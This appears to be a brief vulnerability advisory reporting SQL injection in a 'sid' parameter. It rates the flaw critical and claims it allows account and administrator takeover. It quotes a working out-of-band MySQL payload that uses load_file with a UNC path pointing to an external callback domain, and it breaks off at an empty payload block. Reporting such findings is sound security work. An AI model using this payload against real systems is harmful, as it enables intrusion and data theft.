## Description:
The sid parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\hpakhalh9fna33ycceif60g1msslgb427qydp1e.tarator.net\\gdi'))+' was submitted in the sid parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker can take account control of all accounts plus an administrator account on this system.
Status: CRITICAL

[+] Payload:

```mysql
